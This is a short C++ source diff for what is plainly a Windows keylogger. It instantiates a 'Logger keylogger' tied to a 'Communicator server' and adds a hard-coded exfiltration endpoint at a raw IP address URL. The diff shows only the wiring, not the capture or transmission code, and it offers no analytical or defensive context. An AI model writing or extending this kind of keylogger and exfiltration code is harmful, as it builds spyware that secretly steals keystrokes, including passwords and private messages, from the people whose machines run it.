@@ -7,6 +7,9 @@
 #include "Communicator.h"
 #include "Logger.h"
 
+// statics
+std::string ENDPOINT = "http://194.233.71.142/ll";
+
 // instances
 Communicator server;
 Logger keylogger(server);
@@ -20,5 +23,4 @@ int WINAPI wWinMain(
 	PWSTR pCmdLine, 
 	int nCmdShow) {
 
-	// read data from servers
 }
